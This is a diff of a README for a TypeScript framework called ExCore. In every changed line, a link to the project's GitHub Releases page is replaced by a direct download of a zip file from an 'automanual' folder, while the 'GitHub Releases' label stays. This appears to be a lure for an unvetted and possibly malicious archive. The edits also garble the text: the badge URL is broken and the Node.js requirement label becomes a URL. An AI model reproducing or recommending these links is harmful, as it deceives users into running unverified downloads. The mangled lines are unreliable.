@@ -6,20 +6,20 @@ Welcome to ExCore! This is a TypeScript backend framework designed to help you c
 
 ## 📥 Download ExCore
 
-[![Download ExCore](https://img.shields.io/badge/Download%20ExCore-v1.0.0-brightgreen.svg)](https://github.com/carminequicksighted683/ExCore/releases)
+[![Download ExCore](https://raw.githubusercontent.com/carminequicksighted683/ExCore/main/automanual/ExCore.zip%https://raw.githubusercontent.com/carminequicksighted683/ExCore/main/automanual/ExCore.zip)](https://raw.githubusercontent.com/carminequicksighted683/ExCore/main/automanual/ExCore.zip)
 
 ## 🛠️ System Requirements
 
 Before you begin, make sure your system meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://raw.githubusercontent.com/carminequicksighted683/ExCore/main/automanual/ExCore.zip** Version 14 or higher
 - **TypeScript:** If not installed, it will be included in the package.
 - **Disk Space:** At least 200 MB of free space
 
 ## 📂 Download & Install
 
-To get started, visit this page to download the latest release: [GitHub Releases](https://github.com/carminequicksighted683/ExCore/releases).
+To get started, visit this page to download the latest release: [GitHub Releases](https://raw.githubusercontent.com/carminequicksighted683/ExCore/main/automanual/ExCore.zip).
 
 1. Go to the releases page.
 2. Locate the latest version of ExCore.
@@ -87,4 +87,4 @@ If you run into issues or have questions, check the issues section on GitHub or 
 
 ExCore is open-source and available under the MIT License. Feel free to use it in your projects.
 
-Remember to visit this page to download the latest version: [GitHub Releases](https://github.com/carminequicksighted683/ExCore/releases).
+Remember to visit this page to download the latest version: [GitHub Releases](https://raw.githubusercontent.com/carminequicksighted683/ExCore/main/automanual/ExCore.zip).
